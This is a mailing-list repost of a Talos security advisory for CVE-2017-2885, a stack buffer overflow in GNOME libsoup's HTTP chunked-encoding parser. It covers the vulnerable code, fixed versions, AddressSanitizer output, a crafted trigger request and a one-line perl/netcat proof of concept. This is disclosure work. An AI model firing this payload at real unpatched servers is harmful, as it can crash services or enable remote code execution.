@@ -1,0 +1,338 @@
+
+Date: Wed, 16 Aug 2017 17:13:34 +0200
+From: Tobias Mueller <tobiasmue@...me.org>
+To: oss-security@...ts.openwall.com
+Subject: Re: CVE-2017-2885 libsoup - stack based buffer overflow with HTTP
+ Chunked Encoding
+
+Hi.
+
+The GNOME project has received an excellent report from Aleksandar
+Nikolic of Cisco Talos.
+
+In essence, libsoup is susceptible to a stack based buffer overflow
+attack when using chunked encoding. Regardless of libsoup being used as
+a server or client.
+
+GNOME tracks this bug under
+https://bugzilla.gnome.org/show_bug.cgi?id=785774
+
+libsoup as of version libsoup-2.59.90.1, 2.58.2, and 2.56.1 carry a
+fix.
+
+
+The full report comes here. Again, thanks to Talos.
+
+GNOME libsoup HTTP Chunked Encoding Remote Code Execution Vulnerability
+
+
+### Summary
+
+An exploitable stack based buffer overflow vulnerability exists in the
+GNOME libsoup 2.58. A specially crafted HTTP request can cause a stack
+overflow resulting in remote code execution. An attacker can send a
+special HTTP request to the vulnerable server to trigger this
+vulnerability. 
+
+
+### Tested Versions
+
+GNOME libsoup 2.58
+
+
+### Product URLs
+
+[https://wiki.gnome.org/action/show/Projects/libsoup](https://wiki.gnom
+e.org/action/show/Projects/libsoup)
+
+
+### CVSSv3 Score
+
+9.8 - CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
+
+
+### CWE
+
+CWE-121: Stack-based Buffer Overflow
+
+
+### Details
+
+GNOME libsoup is a library implementing client and server side code for
+dealing with HTTP requests and responses. It is used to implement
+custom web servers or clients. Usually it is used embedded in other
+applications such as media streaming servers for basic web server
+functionality. It can also be used standalone and embedded in hardware
+devices. 
+
+When processing an HTTP request which contains chunk encoded data, an
+improper bounds checking can lead to large memory copy operation which
+can overflow a statically sized buffer on the stack. Buffer that is
+being overflown is located in function
+`soup_body_input_stream_read_chunked` in file libsoup/soup-body-input-
+stream.c:
+
+  static gssize
+  soup_body_input_stream_read_chunked (SoupBodyInputStream  *bistream,
+                                       void                 *buffer,
+                                       gsize                 count,
+                                       gboolean              blocking,
+                                       GCancellable         *cancellabl
+e,
+                                       GError              **error)
+  {
+          SoupFilterInputStream *fstream = SOUP_FILTER_INPUT_STREAM
+(bistream->priv->base_stream);
+          char metabuf[128];                                [1]
+          gssize nread;
+          gboolean got_line;
+
+The buffer is allocated on the stack at [1]. While further processing
+the body of a chunk-encoded HTTP request, function
+`soup_filter_input_stream_read_line` is called:
+
+
+          case SOUP_BODY_INPUT_STREAM_STATE_CHUNK_END:
+                  nread = soup_filter_input_stream_read_line (
+                          SOUP_FILTER_INPUT_STREAM (bistream->priv-
+>base_stream),
+                          metabuf, sizeof (metabuf), blocking,
+                          &got_line, cancellable, error);
+
+In the above code, we can see `metabuf` and it’s length being passed to
+the `soup_filter_input_stream_read_line` function which is just a
+wrapper around `soup_filter_input_stream_read_until` being called with
+new line as delimiter:
+
+  gssize
+  soup_filter_input_stream_read_line (SoupFilterInputStream  *fstream,
+                                      void                   *buffer,
+                                      gsize                   length,
+                                      gboolean                blocking,
+                                      gboolean               *got_line,
+                                      GCancellable           *cancellab
+le,
+                                      GError                **error)
+  {
+          return soup_filter_input_stream_read_until (fstream, buffer,
+length,
+                                                      "\n", 1,
+blocking,
+                                                      TRUE, got_line,
+                                                      cancellable,
+error);
+  }
+
+Function `soup_filter_input_stream_read_until` does the actual reading
+from the input stream into the buffer. 
+          /* Scan for the boundary */
+          end = buf + fstream->priv->buf-
+>len;                                        [2]
+          if (!eof)
+                  end -= boundary_length;
+          for (p = buf; p <= end; p++)
+{                                                [3]
+                  if (*p == *(guint8*)boundary &&
+                      !memcmp (p, boundary, boundary_length))
+{                        [4]
+                          if (include_boundary)
+                                  p += boundary_length;
+                          *got_boundary = TRUE;
+                          break;
+                  }
+          }
+
+          if (!*got_boundary && fstream->priv->buf->len < length &&
+!eof)
+                  goto fill_buffer;
+
+          /* Return everything up to 'p' (which is either just after
+the boundary if
+           * include_boundary is TRUE, just before the boundary if
+include_boundary is
+           * FALSE, @boundary_len - 1 bytes before the end of the
+buffer, or end-of-
+           * file).
+           */
+          return read_from_buf (fstream, buffer, p -
+buf);                                [5]
+
+In the above code, at [2] a pointer to the end of the stream data is
+calculated, at [3] it is used as an end condition in a for loop which
+is looking for a set delimiter (variable `boundary`, a newline
+character in this case) at [4]. Pointer `p` is being incremented in the
+loop until newline is found. Finally, at [5], function `read_from_buf`
+is called with input stream as source, buffer as destination and offset
+to newline character as length. No check to make sure the buffer is big
+enough is performed anywhere. In the function `read_from_buf` a
+`memcpy` call can thus lead to a buffer overflow:
+
+  static gssize
+  read_from_buf (SoupFilterInputStream *fstream, gpointer buffer, gsize
+count)
+  {
+          GByteArray *buf = fstream->priv->buf;
+
+          if (buf->len < count)
+                  count = buf->len;
+          memcpy (buffer, buf->data, count);
+
+
+To trigger this vulnerability, a simple HTTP request like the following
+is enough:
+  GET / HTTP/1.0
+  Transfer-Encoding: chunked
+
+
+  1
+ 
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+AAAAAAAA
+
+When parsing this request, the first chunk will be of size 1, and then
+the parser proceeds to scan the overly long series of `A` characters
+for a new line. A string longer than 128 characters will overflow the
+buffer. This can be abused in order to crash the server or achieve
+remote code execution in the context of the server. 
+When parsing this request, the first chunk will be of size 1, and then
+the parser proceeds to scan the overly long series of `A` characters
+for a new line. A string longer than 128 characters will overflow the
+buffer. This can be abused in order to crash the server or achieve
+remote code execution in the context of the server. 
+
+### Crash Information 
+
+Address Sanitizer output:
+
+  Listening on http://0.0.0.0:12323/
+  Listening on http://[::]:12323/
+
+
+  Waiting for requests...
+  =================================================================
+  ==119749==ERROR: AddressSanitizer: stack-buffer-overflow on address
+0x7fffffffb280 at pc 0x0000004a3bfd bp 0x7fffffffb010 sp 0x7fffffffa7c0
+  WRITE of size 151 at 0x7fffffffb280 thread T0
+      #0 0x4a3bfc in __asan_memcpy ??:?
+      #1 0x4a3bfc in ?? ??:0
+      #2 0x7ffff7962126 in read_from_buf
+/home/user/libsoup/libsoup/libsoup/soup-filter-input-stream.c:59
+      #3 0x7ffff7962126 in soup_filter_input_stream_read_until
+/home/user/libsoup/libsoup/libsoup/soup-filter-input-stream.c:278
+      #4 0x7ffff7962126 in ?? ??:0
+      #5 0x7ffff7961475 in soup_filter_input_stream_read_line
+/home/user/libsoup/libsoup/libsoup/soup-filter-input-stream.c:183
+      #6 0x7ffff7961475 in ?? ??:0
+      #7 0x7ffff791fd45 in soup_body_input_stream_read_chunked
+/home/user/libsoup/libsoup/libsoup/soup-body-input-stream.c:194
+      #8 0x7ffff791fd45 in read_internal
+/home/user/libsoup/libsoup/libsoup/soup-body-input-stream.c:249
+      #9 0x7ffff791fd45 in ?? ??:0
+      #10 0x7ffff79966b0 in io_read
+/home/user/libsoup/libsoup/libsoup/soup-message-io.c:762
+      #11 0x7ffff79966b0 in ?? ??:0
+      #12 0x7ffff79901b5 in io_run_until
+/home/user/libsoup/libsoup/libsoup/soup-message-io.c:982
+      #13 0x7ffff79901b5 in ?? ??:0
+      #14 0x7ffff7993ee3 in io_run
+/home/user/libsoup/libsoup/libsoup/soup-message-io.c:1053
+      #15 0x7ffff7993ee3 in ?? ??:0
+      #16 0x7ffff7999939 in soup_message_read_request
+/home/user/libsoup/libsoup/libsoup/soup-message-server-io.c:304
+      #17 0x7ffff7999939 in ?? ??:0
+      #18 0x7ffff71a00a6 in g_cclosure_marshal_VOID__OBJECTv ??:?
+      #19 0x7ffff71a00a6 in ?? ??:0
+      #20 0x7ffff719d1d3 in g_closure_invoke ??:?
+      #21 0x7ffff719d1d3 in ?? ??:0
+      #22 0x7ffff71b79a5 in g_signal_emit_valist ??:?
+      #23 0x7ffff71b79a5 in ?? ??:0
+      #24 0x7ffff71b808e in g_signal_emit ??:?
+      #25 0x7ffff71b808e in ?? ??:0
+      #26 0x7ffff79e894a in listen_watch
+/home/user/libsoup/libsoup/libsoup/soup-socket.c:1237
+      #27 0x7ffff79e894a in ?? ??:0
+      #28 0x7ffff6ec6049 in g_main_context_dispatch ??:?
+      #29 0x7ffff6ec6049 in ?? ??:0
+      #30 0x7ffff6ec63ef in g_main_context_dispatch ??:?
+      #31 0x7ffff6ec63ef in ?? ??:0
+      #32 0x7ffff6ec6711 in g_main_loop_run ??:?
+      #33 0x7ffff6ec6711 in ?? ??:0
+      #34 0x4eb8cc in main /home/user/libsoup/libsoup/examples/simple-
+httpd.c:360
+      #35 0x4eb8cc in ?? ??:0
+      #36 0x7ffff5f8a82f in __libc_start_main /build/glibc-
+bfm8X4/glibc-2.23/csu/../csu/libc-start.c:291
+      #37 0x7ffff5f8a82f in ?? ??:0
+      #38 0x419dc8 in _start ??:?
+      #39 0x419dc8 in ?? ??:0
+
+
+  Address 0x7fffffffb280 is located in stack of thread T0 at offset 160
+in frame
+      #0 0x7ffff791f8af in read_internal
+/home/user/libsoup/libsoup/libsoup/soup-body-input-stream.c:237
+      #1 0x7ffff791f8af in ?? ??:0
+
+
+    This frame has 2 object(s):
+      [32, 160) 'metabuf.i'
+      [192, 196) 'got_line.i' <== Memory access at offset 160 partially
+underflows this variable
+  HINT: this may be a false positive if your program uses some custom
+stack unwind mechanism or swapcontext
+        (longjmp and C++ exceptions *are* supported)
+  SUMMARY: AddressSanitizer: stack-buffer-overflow
+(/home/user/libsoup/libsoup/examples/.libs/simple-httpd+0x4a3bfc)
+  Shadow bytes around the buggy address:
+    0x10007fff7600: 00 00 00 00 f1 f1 f1 f1 00 f3 f3 f3 00 00 00 00
+    0x10007fff7610: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x10007fff7620: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x10007fff7630: 00 00 00 00 00 00 00 00 00 00 00 00 f1 f1 f1 f1
+    0x10007fff7640: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  =>0x10007fff7650:[f2]f2 f2 f2 04 f3 f3 f3 00 00 00 00 00 00 00 00
+    0x10007fff7660: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x10007fff7670: 00 00 00 00 ca ca ca ca 00 00 00 00 00 00 00 00
+    0x10007fff7680: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x10007fff7690: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+    0x10007fff76a0: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
+  Shadow byte legend (one shadow byte represents 8 application bytes):
+    Addressable:           00
+    Partially addressable: 01 02 03 04 05 06 07
+    Heap left redzone:       fa
+    Heap right redzone:      fb
+    Freed heap region:       fd
+    Stack left redzone:      f1
+    Stack mid redzone:       f2
+    Stack right redzone:     f3
+    Stack partial redzone:   f4
+    Stack after return:      f5
+    Stack use after scope:   f8
+    Global redzone:          f9
+    Global init order:       f6
+    Poisoned by user:        f7
+    Container overflow:      fc
+    Array cookie:            ac
+    Intra object redzone:    bb
+    ASan internal:           fe
+    Left alloca redzone:     ca
+    Right alloca redzone:    cb
+  ==119749==ABORTING
+
+
+### Exploit Proof-of-Concept 
+    
+  perl -e 'print "GET / HTTP/1.0\r\nTransfer-Encoding:
+chunked\r\n\r\n1\r\n" . "A"x150 .  "\r\n \r\n"' | nc <target> <port>
+
+
+### Credit 
+
+Discovered by Aleksandar Nikolic of Cisco Talos.
+http://talosintelligence.com/vulnerability-reports/
+
+
+
+Cheers,
+  Tobi
+Download attachment "signature.asc" of type "application/pgp-signature" (182 bytes)
